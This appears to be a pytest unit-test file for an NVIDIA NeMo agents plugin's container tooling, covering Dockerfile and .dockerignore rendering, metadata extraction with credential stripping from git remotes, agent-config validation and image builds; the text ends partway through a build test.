# SPDX-FileCopyrightText: Copyright (c) 2025-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Unit tests for the container render / build / publish / validate / metadata modules."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from click.exceptions import Exit as ClickExit

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

VALID_CONFIG = """\
functions:
  current_datetime:
    _type: current_datetime

llms:
  llm:
    _type: openai
    api_key: not-used
    model_name: nvidia-nemotron-3-super-120b-a12b
    temperature: 0.0

workflow:
  _type: react_agent
  tool_names: [current_datetime]
  llm_name: llm
  verbose: false
"""


@pytest.fixture()
def agent_config(tmp_path: Path) -> Path:
    """Write a valid agent config and return the path."""
    p = tmp_path / "config.yaml"
    p.write_text(VALID_CONFIG)
    return p


@pytest.fixture()
def project_dir(tmp_path: Path) -> tuple[Path, Path]:
    """Create a project directory with config + pyproject. Returns (config, pyproject)."""
    (tmp_path / "configs").mkdir()
    config = tmp_path / "configs" / "config.yaml"
    config.write_text(VALID_CONFIG)
    pyproject = tmp_path / "pyproject.toml"
    pyproject.write_text('[project]\nname = "test-agent"\nversion = "2.3.0"\n')
    return config, pyproject


# ---------------------------------------------------------------------------
# Render tests
# ---------------------------------------------------------------------------


class TestRenderDockerfile:
    """Tests for nemo_agents_plugin.container.template."""

    def test_config_only_mode(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        result = render_dockerfile(agent_config, None, nat_version="1.4.0")

        assert "nvidia-nat[most]==" in result
        assert "uv sync" not in result
        assert "NAT_CONFIG_FILE=/workspace/config.yaml" in result
        assert "ARG NAT_VERSION=1.4.0" in result

    def test_project_mode(self, project_dir: tuple[Path, Path]) -> None:
        """Project mode trusts pyproject.toml as the single source of truth.

        The template must run exactly ``uv pip install .`` and nothing else
        dependency-related — no implicit ``nvidia-nat[most]`` pre-install
        to paper over commented-out deps, and no
        ``SETUPTOOLS_SCM_PRETEND_VERSION`` to paper over monorepo-relative
        ``[tool.setuptools_scm]`` roots.  Those are pyproject bugs the
        user is expected to fix, not workarounds the packager should bake in.
        ``uv sync`` is also avoided so ``[tool.uv.sources]`` path overrides
        don't silently pull sibling packages from outside the build context.
        """
        from nemo_agents_plugin.container.template import render_dockerfile

        config, pyproject = project_dir
        result = render_dockerfile(config, pyproject, nat_version="1.4.0")

        assert "uv pip install ." in result
        assert ". /workspace/.venv/bin/activate" in result
        assert "UV_LINK_MODE=copy" in result
        assert "NAT_CONFIG_FILE=/workspace/configs/config.yaml" in result

        # No dependency-workarounds baked into the install step — comments
        # mentioning these concepts are fine, but nothing in an actual RUN
        # command should reference them.
        forbidden_in_commands = (
            "uv sync",
            "nvidia-nat[most]",
            "SETUPTOOLS_SCM_PRETEND_VERSION",
        )
        for line in result.splitlines():
            if line.lstrip().startswith("#"):
                continue
            for needle in forbidden_in_commands:
                assert needle not in line, (
                    f"project mode must not workaround pyproject bugs — found {needle!r} in: {line!r}"
                )

    def test_custom_overrides(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        result = render_dockerfile(
            agent_config,
            None,
            base_image_url="custom/image",
            base_image_tag="99.99",
            python_version="3.12",
            nat_version="2.0.0",
            uv_version="0.9.0",
        )

        assert "ARG BASE_IMAGE_URL=custom/image" in result
        assert "ARG BASE_IMAGE_TAG=99.99" in result
        assert "ARG PYTHON_VERSION=3.12" in result
        assert "ARG NAT_VERSION=2.0.0" in result
        assert "ghcr.io/astral-sh/uv:0.9.0" in result

    def test_env_var_fallback(self, agent_config: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        monkeypatch.setenv("NAT_VERSION", "1.5.0")
        monkeypatch.setenv("NAT_PYTHON_VERSION", "3.11")

        result = render_dockerfile(agent_config, None)

        assert "ARG NAT_VERSION=1.5.0" in result
        assert "ARG PYTHON_VERSION=3.11" in result

    def test_missing_nat_version_falls_back_to_default(
        self, agent_config: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """``nat_version`` now has a pinned default so renders succeed without --nat-version.

        The default is kept in sync with a release where ``nvidia-nat[most]`` and every
        plugin extra target the same core ABI (avoids runtime ImportError drift).
        """
        from nemo_agents_plugin.container.template import _DEFAULTS, render_dockerfile

        monkeypatch.delenv("NAT_VERSION", raising=False)

        result = render_dockerfile(agent_config, None)

        default = _DEFAULTS["nat_version"]
        assert f"ARG NAT_VERSION={default}" in result
        assert f'com.nemo.agent.nat-version="{default}"' in result

    def test_non_root_user_by_default(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        result = render_dockerfile(agent_config, None, nat_version="1.4.0")

        assert "USER agent" in result
        assert "groupadd" in result
        assert "useradd" in result
        assert "chown -R agent:agent /workspace" in result
        # Regression: Ubuntu 24.04 "noble" (and other modern base images) ship
        # a default unprivileged user at uid/gid=1000.  The previous hardcoded
        # ``groupadd -g 1000 agent`` collided with that user and the build
        # failed with ``groupadd: GID '1000' already exists`` (exit code 4).
        # The template now reclaims uid/gid 1000 first; assert *both* guards
        # are present so a regression on either half is caught.
        assert "getent passwd 1000" in result
        assert "getent group  1000" in result
        assert "userdel -rf" in result
        assert "groupdel -f" in result

    def test_allow_root_skips_user(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        result = render_dockerfile(agent_config, None, nat_version="1.4.0", allow_root=True)

        assert "USER agent" not in result
        assert "groupadd" not in result

    def test_oci_labels_present(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        result = render_dockerfile(agent_config, None, nat_version="1.4.0")

        assert 'com.nemo.agent.id="' in result
        assert 'org.opencontainers.image.title="config"' in result
        assert 'com.nemo.agent.nat-version="1.4.0"' in result
        assert 'com.nemo.agent.contract-version="' in result
        assert 'com.nemo.agent.framework="nemo_agent_toolkit"' in result
        assert 'org.opencontainers.image.description="react_agent agent"' in result
        assert 'org.opencontainers.image.revision="' in result
        assert 'org.opencontainers.image.source="' in result

    def test_oci_labels_with_explicit_metadata(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        result = render_dockerfile(
            agent_config,
            None,
            nat_version="1.4.0",
            agent_version="3.0.0",
            agent_author="Test Author",
        )

        assert 'org.opencontainers.image.version="3.0.0"' in result
        assert 'org.opencontainers.image.authors="Test Author"' in result

    def test_oci_labels_from_pyproject(self, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        config, pyproject = project_dir
        result = render_dockerfile(config, pyproject, nat_version="1.4.0")

        assert 'org.opencontainers.image.title="test-agent"' in result
        assert 'org.opencontainers.image.version="2.3.0"' in result

    def test_oci_labels_description_and_license_from_pyproject(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        (tmp_path / "configs").mkdir()
        config = tmp_path / "configs" / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text(
            '[project]\nname = "licensed-agent"\nversion = "1.0.0"\n'
            'description = "A calculator agent for math queries"\n'
            'license = "Apache-2.0"\n'
        )

        result = render_dockerfile(config, pyproject, nat_version="1.4.0")

        assert 'org.opencontainers.image.description="A calculator agent for math queries"' in result
        assert 'org.opencontainers.image.licenses="Apache-2.0"' in result

    def test_oci_licenses_omitted_when_absent(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        result = render_dockerfile(agent_config, None, nat_version="1.4.0")

        assert "org.opencontainers.image.licenses" not in result

    def test_hardened_apt_get(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        result = render_dockerfile(agent_config, None, nat_version="1.4.0")

        assert "--no-install-recommends" in result
        assert "rm -rf /var/lib/apt/lists/*" in result

    def test_uv_python_outside_root(self, agent_config: Path, project_dir: tuple[Path, Path]) -> None:
        """Managed Python must land outside /root so the non-root user can exec it.

        Regression: before this fix, uv placed the managed interpreter at
        /root/.local/share/uv/python/... which the agent user (uid 1000) could
        not traverse, causing 'exec: nat: Permission denied' at runtime.
        """
        from nemo_agents_plugin.container.template import render_dockerfile

        config_only = render_dockerfile(agent_config, None, nat_version="1.4.0")
        cfg_path, pyproj = project_dir
        with_proj = render_dockerfile(cfg_path, pyproj, nat_version="1.4.0")

        for result in (config_only, with_proj):
            assert "UV_PYTHON_INSTALL_DIR=/opt/uv/python" in result
            assert "UV_LINK_MODE=copy" in result
            assert "chmod -R a+rX /opt/uv /workspace/.venv" in result
            assert "/root/.local" not in result

    def test_external_template(self, agent_config: Path, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerfile

        custom = tmp_path / "custom.dockerfile.j2"
        custom.write_text("FROM ubuntu\nRUN echo {{ nat_version }}\n")

        result = render_dockerfile(agent_config, None, nat_version="9.9.9", template_path=str(custom))

        assert "FROM ubuntu" in result
        assert "echo 9.9.9" in result


# ---------------------------------------------------------------------------
# .dockerignore tests
# ---------------------------------------------------------------------------


class TestRenderDockerignore:
    def test_writes_file(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerignore

        path = render_dockerignore(tmp_path)
        assert path is not None  # narrow Path | None
        assert path.exists()
        assert path.name == ".dockerignore"

    def test_contents(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.template import render_dockerignore

        path = render_dockerignore(tmp_path)
        assert path is not None  # narrow Path | None
        content = path.read_text()
        assert ".env" in content
        assert ".git/" in content
        assert "__pycache__/" in content
        assert "*.pem" in content
        assert "credentials.json" in content
        assert ".venv/" in content
        assert "node_modules/" in content


# ---------------------------------------------------------------------------
# Metadata tests
# ---------------------------------------------------------------------------


class TestExtractAgentMetadata:
    def test_basic_extraction(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="Git User\n")
            meta = extract_agent_metadata(agent_config)

        import re

        assert meta["agent_name"] == "config"
        assert re.match(r"\d{2}\.\d{2}\.\d{2}$", meta["agent_version"]), (
            f"Expected YY.MM.DD, got {meta['agent_version']}"
        )
        assert meta["agent_author"] == "Git User"
        assert meta["agent_framework"] == "nemo_agent_toolkit"
        assert len(meta["agent_id"]) == 12
        assert meta["build_timestamp"]

    def test_pyproject_overrides_name_and_version(self, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config, pyproject = project_dir

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="Someone\n")
            meta = extract_agent_metadata(config, pyproject)

        assert meta["agent_name"] == "test-agent"
        assert meta["agent_version"] == "2.3.0"

    def test_explicit_overrides_take_priority(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta = extract_agent_metadata(
            agent_config,
            agent_version="override-v",
            agent_author="override-author",
        )

        assert meta["agent_version"] == "override-v"
        assert meta["agent_author"] == "override-author"

    def test_agent_id_is_deterministic(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta1 = extract_agent_metadata(agent_config, agent_author="x")
        meta2 = extract_agent_metadata(agent_config, agent_author="x")
        assert meta1["agent_id"] == meta2["agent_id"]

    def test_agent_id_differs_for_different_config(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        c1 = tmp_path / "a.yaml"
        c1.write_text("workflow:\n  _type: react_agent\n")
        c2 = tmp_path / "b.yaml"
        c2.write_text("workflow:\n  _type: tool_calling_agent\n")

        m1 = extract_agent_metadata(c1, agent_author="x")
        m2 = extract_agent_metadata(c2, agent_author="x")
        assert m1["agent_id"] != m2["agent_id"]

    def test_no_workflow_key_gives_unknown_framework(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text("llms:\n  llm: {}\n")

        meta = extract_agent_metadata(config, agent_author="x")
        assert meta["agent_framework"] == "unknown"

    def test_git_failure_falls_back_to_unknown(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.side_effect = FileNotFoundError
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["agent_author"] == "unknown"

    def test_agent_id_includes_pyproject(self, project_dir: tuple[Path, Path]) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config, pyproject = project_dir

        meta_with = extract_agent_metadata(config, pyproject, agent_author="x")
        meta_without = extract_agent_metadata(config, agent_author="x")
        assert meta_with["agent_id"] != meta_without["agent_id"]

    def test_description_from_pyproject(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "my-agent"\ndescription = "Handles math queries"\n')

        meta = extract_agent_metadata(config, pyproject, agent_author="x")
        assert meta["description"] == "Handles math queries"

    def test_description_fallback_to_workflow_type(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta = extract_agent_metadata(agent_config, agent_author="x")
        assert meta["description"] == "react_agent agent"

    def test_description_empty_when_no_workflow(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text("llms:\n  llm: {}\n")

        meta = extract_agent_metadata(config, agent_author="x")
        assert meta["description"] == ""

    def test_licenses_from_pyproject_string(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "x"\nlicense = "Apache-2.0"\n')

        meta = extract_agent_metadata(config, pyproject, agent_author="x")
        assert meta["licenses"] == "Apache-2.0"

    def test_licenses_from_pyproject_legacy_dict(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        config = tmp_path / "config.yaml"
        config.write_text(VALID_CONFIG)
        pyproject = tmp_path / "pyproject.toml"
        pyproject.write_text('[project]\nname = "x"\nlicense = {text = "MIT"}\n')

        meta = extract_agent_metadata(config, pyproject, agent_author="x")
        assert meta["licenses"] == "MIT"

    def test_licenses_empty_when_absent(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        meta = extract_agent_metadata(agent_config, agent_author="x")
        assert meta["licenses"] == ""

    def test_revision_from_git(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="abc123def456\n")
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["revision"] == "abc123def456"

    def test_revision_empty_on_git_failure(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.side_effect = FileNotFoundError
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["revision"] == ""

    def test_source_from_git(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout="https://github.com/org/repo.git\n")
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["source"] == "https://github.com/org/repo.git"

    def test_source_empty_on_git_failure(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.metadata import extract_agent_metadata

        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.side_effect = FileNotFoundError
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert meta["source"] == ""

    def test_source_strips_embedded_credentials(self, agent_config: Path) -> None:
        """Never leak PATs, passwords, or OAuth tokens into the image source label.

        Covers every remote-URL shape we've seen developers use: GitLab PAT,
        HTTP basic auth, GitHub oauth2 token, SSH (no creds), plain HTTPS
        (no creds), and a malformed URL (returned unchanged, best-effort).
        """
        from nemo_agents_plugin.container.metadata import _strip_credentials, extract_agent_metadata

        # Direct helper — exhaustive scheme/credential combinations.
        # Credentialed URLs are assembled at runtime from neutral ``user`` /
        # ``token`` placeholders so the source file never contains a literal
        # ``scheme://X:Y@host`` substring that secret scanners (TruffleHog,
        # gitleaks) flag as an unverified URI on push.
        # The bare-userinfo case (no ``:``) is kept because it exercises a
        # different branch in ``_strip_credentials`` than the basic-auth
        # ``user:token`` form.
        user, token = "user", "token"
        gl_host = "gitlab-master.nvidia.com"
        gh_host = "github.com"
        gl_basic = f"https://{user}:{token}@{gl_host}/org/repo.git"
        gl_token_only = f"https://{token}@{gl_host}/org/repo.git"
        gh_basic = f"https://{user}:{token}@{gh_host}/org/repo.git"
        cases = {
            gl_basic: f"https://{gl_host}/org/repo.git",
            gl_token_only: f"https://{gl_host}/org/repo.git",
            gh_basic: f"https://{gh_host}/org/repo.git",
            f"https://{gh_host}/org/repo.git": f"https://{gh_host}/org/repo.git",
            f"git@{gl_host}:aire/microservices/nmp.git": f"git@{gl_host}:aire/microservices/nmp.git",
            f"ssh://git@{gl_host}:12051/aire/microservices/nmp.git": f"ssh://git@{gl_host}:12051/aire/microservices/nmp.git",
            "": "",
        }
        for raw, expected in cases.items():
            assert _strip_credentials(raw) == expected, f"failed for {raw!r}"

        # End-to-end: a credential-bearing remote must not survive into meta["source"].
        pat_url = f"https://{user}:{token}@{gl_host}/owner/x.git"
        with patch("nemo_agents_plugin.container.metadata.subprocess") as mock_sub:
            mock_sub.run.return_value = MagicMock(returncode=0, stdout=pat_url + "\n")
            mock_sub.TimeoutExpired = TimeoutError
            meta = extract_agent_metadata(agent_config)

        assert token not in meta["source"]
        assert f"{user}:" not in meta["source"]
        assert meta["source"] == f"https://{gl_host}/owner/x.git"


# ---------------------------------------------------------------------------
# Validator tests
# ---------------------------------------------------------------------------


class TestValidateAgentConfig:
    def test_valid_config_passes(self, agent_config: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        result = validate_agent_config(agent_config)
        assert result.valid
        assert result.errors == []

    def test_invalid_yaml(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "bad.yaml"
        p.write_text("{{invalid yaml: [}")
        result = validate_agent_config(p)
        assert not result.valid
        assert any("YAML parse error" in e for e in result.errors)

    def test_missing_workflow_key(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("functions:\n  foo:\n    _type: bar\n")

        result = validate_agent_config(p)
        assert not result.valid
        assert any("workflow" in e for e in result.errors)

    def test_unknown_workflow_type_warns_does_not_fail(self, tmp_path: Path) -> None:
        """Unknown ``workflow._type`` is a soft warning, not a hard error.

        NAT plugins can register additional workflow types at runtime; a
        closed allowlist here used to hard-fail on otherwise-valid configs
        and force operators to ``--skip-validation``.  The check now
        surfaces unfamiliar types as warnings and lets the build proceed.
        """
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("workflow:\n  _type: unknown_agent_type\n")

        result = validate_agent_config(p)
        assert result.valid, f"unknown type should not block validation; got errors: {result.errors}"
        assert any("unknown_agent_type" in w for w in result.warnings)
        # Built-in known types are still listed in the message so operators
        # can quickly tell whether they made a typo vs. invoked a plugin.
        assert any("react_agent" in w for w in result.warnings)

    def test_known_workflow_types_pass(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        for wf_type in (
            "claude_code_agent",
            "codex_agent",
            "cursor_agent",
            "hermes_agent",
            "react_agent",
            "tool_calling_agent",
            "reasoning_agent",
            "rewoo_agent",
        ):
            p = tmp_path / f"{wf_type}.yaml"
            p.write_text(f"workflow:\n  _type: {wf_type}\n")
            result = validate_agent_config(p)
            assert result.valid, f"Expected {wf_type} to pass validation"
            assert result.warnings == []

    def test_missing_tool_reference(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text(
            "functions:\n  existing_fn:\n    _type: foo\n"
            "workflow:\n  _type: react_agent\n  tool_names: [existing_fn, ghost_fn]\n"
        )

        result = validate_agent_config(p)
        assert not result.valid
        assert any("ghost_fn" in e for e in result.errors)
        assert not any("existing_fn" in e for e in result.errors)

    def test_function_groups_satisfy_tool_names(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text(
            "function_groups:\n  calculator:\n    _type: calculator\n"
            "workflow:\n  _type: react_agent\n  tool_names: [calculator]\n"
        )

        result = validate_agent_config(p)
        assert result.valid

    def test_missing_llm_reference(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text(
            "llms:\n  real_llm:\n    _type: openai\nworkflow:\n  _type: react_agent\n  llm_name: missing_llm\n"
        )

        result = validate_agent_config(p)
        assert not result.valid
        assert any("missing_llm" in e for e in result.errors)

    def test_non_dict_root(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("- item1\n- item2\n")

        result = validate_agent_config(p)
        assert not result.valid
        assert any("mapping" in e for e in result.errors)

    def test_workflow_not_a_dict(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("workflow: just_a_string\n")

        result = validate_agent_config(p)
        assert not result.valid
        assert any("mapping" in e for e in result.errors)

    def test_workflow_without_type_is_rejected(self, tmp_path: Path) -> None:
        """A workflow lacking ``_type`` must fail validation.

        Regression: the original validator only flagged *unknown* types
        and short-circuited on missing/empty ones, so a config like
        ``workflow: { tool_names: [] }`` was accepted — only for the
        downstream ``nat serve`` to crash inside the built container.
        The validator now treats both missing-type and empty-string-type
        as errors and lists the allowed values in the message so the
        operator can fix it without re-checking the docs.
        """
        from nemo_agents_plugin.container.validator import _KNOWN_WORKFLOW_TYPES, validate_agent_config

        for body in ("workflow:\n  tool_names: []\n", 'workflow:\n  _type: ""\n  tool_names: []\n'):
            p = tmp_path / "config.yaml"
            p.write_text(body)
            result = validate_agent_config(p)
            assert not result.valid
            assert any("workflow._type" in e for e in result.errors)
            # Allowed values are surfaced so the message is actionable.
            for known in _KNOWN_WORKFLOW_TYPES:
                assert any(known in e for e in result.errors)

    def test_multiple_errors_collected(self, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        p.write_text("workflow:\n  _type: invalid_type\n  tool_names: [ghost1, ghost2]\n  llm_name: phantom\n")

        result = validate_agent_config(p)
        assert not result.valid
        assert len(result.errors) >= 3

    def test_unreadable_config_returns_structured_error(self, tmp_path: Path) -> None:
        """``read_text`` failures surface as ``ValidationResult``, not tracebacks.

        Two paths exercised: missing file (``FileNotFoundError``) and a
        non-UTF-8 binary blob (``UnicodeDecodeError``).  Both must produce a
        ``valid=False`` result with an explanatory error so the CLI builder
        path can print a clean "Agent config validation failed" message
        instead of leaking an ``OSError`` traceback to the operator.
        """
        from nemo_agents_plugin.container.validator import validate_agent_config

        missing = tmp_path / "no_such.yaml"
        result_missing = validate_agent_config(missing)
        assert not result_missing.valid
        assert any("Unable to read config file" in e for e in result_missing.errors)

        binary = tmp_path / "binary.yaml"
        # 0x80 is invalid as a UTF-8 leading byte → ``UnicodeDecodeError``.
        binary.write_bytes(b"\x80\x81\x82")
        result_binary = validate_agent_config(binary)
        assert not result_binary.valid
        assert any("not valid UTF-8" in e for e in result_binary.errors)

    def test_malformed_workflow_fields_are_rejected(self, tmp_path: Path) -> None:
        """tool_names / llm_name / llms with the wrong YAML type must error.

        Regression: ``isinstance(tool_names, list)`` and the analogous
        ``isinstance(llms, dict)`` guards used to silently skip validation
        when the YAML had ``tool_names: my_tool`` (string) or
        ``llms: [...]`` (list).  A non-string ``llm_name`` could even
        raise ``TypeError`` at the membership check.  All three malformed
        shapes now produce structured errors before any membership lookup.
        """
        from nemo_agents_plugin.container.validator import validate_agent_config

        p = tmp_path / "config.yaml"
        # All three malformed shapes packed into one config so a single
        # validation pass exercises every new rejection branch.
        p.write_text(
            "workflow:\n"
            "  _type: react_agent\n"
            "  tool_names: my_tool\n"  # string, must be list
            "  llm_name: [a, b]\n"  # list, must be string
            "llms:\n"
            "  - first\n"  # list, must be mapping
        )
        result = validate_agent_config(p)
        assert not result.valid
        joined = " || ".join(result.errors)
        assert "workflow.tool_names must be a list" in joined
        assert "workflow.llm_name must be a string" in joined
        # ``llms`` mapping error is only checked when ``llm_name`` is a
        # valid string, so verify it in its own minimal config.
        p2 = tmp_path / "config2.yaml"
        p2.write_text("workflow:\n  _type: react_agent\n  llm_name: x\nllms:\n  - first\n")
        result2 = validate_agent_config(p2)
        assert not result2.valid
        assert any("'llms' must be a mapping" in e for e in result2.errors)


# ---------------------------------------------------------------------------
# Build tests
# ---------------------------------------------------------------------------


class TestBuildAgentImage:
    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_with_provided_dockerfile(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        dockerfile = agent_config.parent / "Dockerfile"
        dockerfile.write_text("FROM ubuntu")
        mock_build.return_value = "my-agent:latest"

        result = build_agent_image(
            agent_config,
            dockerfile=dockerfile,
            tag="my-agent:latest",
            nat_version="1.4.0",
        )

        assert result == "my-agent:latest"
        mock_build.assert_called_once()
        assert mock_build.call_args.kwargs["dockerfile"] == dockerfile

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_renders_on_the_fly(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        mock_build.return_value = "config-abc123:0.0.0"

        build_agent_image(agent_config, nat_version="1.4.0", agent_author="x")

        tag = mock_build.call_args.kwargs["tag"]
        assert tag.startswith("config-")
        assert ":" in tag
        mock_build.assert_called_once()
        assert not (agent_config.parent / "Dockerfile.generated").exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_cleans_up_dockerignore(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        mock_build.return_value = "config-abc:0.0.0"
        build_agent_image(agent_config, nat_version="1.4.0", generate_ignore=True, agent_author="x")

        assert not (agent_config.parent / ".dockerignore").exists()
        assert not (agent_config.parent / "Dockerfile.generated").exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_preserves_committed_plugin_managed_dockerignore(
        self, mock_build: MagicMock, agent_config: Path
    ) -> None:
        """A pre-existing committed ``.dockerignore`` must survive a build.

        Regression: ``render_dockerignore`` regenerates plugin-managed
        files in place (sentinel match = "safe to refresh") and returns
        the path.  The build path used to treat any returned path as a
        transient artifact and unlinked it in the ``finally`` cleanup —
        which deleted a committed-and-checked-in ``.dockerignore`` whose
        sentinel header marked it as plugin-managed.  Cleanup now only
        deletes files this run actually *created* (file did not exist
        before the build).  Both content and existence are checked.
        """
        from nemo_agents_plugin.container.builder import build_agent_image
        from nemo_agents_plugin.container.template import DOCKERIGNORE_SENTINEL

        ignore = agent_config.parent / ".dockerignore"
        committed = f"{DOCKERIGNORE_SENTINEL}\n# user-committed tweak\nignore-me/\n"
        ignore.write_text(committed)

        mock_build.return_value = "config-abc:0.0.0"
        build_agent_image(agent_config, nat_version="1.4.0", generate_ignore=True, agent_author="x")

        assert ignore.exists(), "committed .dockerignore was deleted by build cleanup"
        # Content may have been regenerated (sentinel-marked = safe to
        # refresh), so we only assert the sentinel header survived — the
        # file is still there for the next ``docker build`` to consume.
        assert ignore.read_text().splitlines()[0] == DOCKERIGNORE_SENTINEL

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_no_ignore(self, mock_build: MagicMock, agent_config: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        mock_build.return_value = "config-abc:0.0.0"
        build_agent_image(agent_config, nat_version="1.4.0", generate_ignore=False, agent_author="x")

        assert not (agent_config.parent / ".dockerignore").exists()

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_default_tag_from_metadata(self, mock_build: MagicMock, project_dir: tuple[Path, Path]) -> None:
        """Default tag follows the ``{agent_name}-{agent_id}:{agent_version}`` convention."""
        from nemo_agents_plugin.container.builder import build_agent_image

        config, pyproject = project_dir
        mock_build.return_value = "placeholder"

        build_agent_image(config, pyproject=pyproject, nat_version="1.4.0", agent_author="x")

        tag = mock_build.call_args.kwargs["tag"]
        assert tag.startswith("test-agent-"), f"Expected tag to start with 'test-agent-', got {tag}"
        name_id, version = tag.rsplit(":", 1)
        assert version == "2.3.0"
        agent_id_part = name_id.split("-", 2)[-1]
        assert len(agent_id_part) == 12, f"agent_id should be 12-char hex, got '{agent_id_part}'"

    @patch("nemo_agents_plugin.container.builder.docker_build")
    def test_build_runs_validation_by_default(self, mock_build: MagicMock, tmp_path: Path) -> None:
        from nemo_agents_plugin.container.builder import build_agent_image

        bad = tmp_path / "bad.yaml"
        bad.write_text("no_workflow_here: true\n")
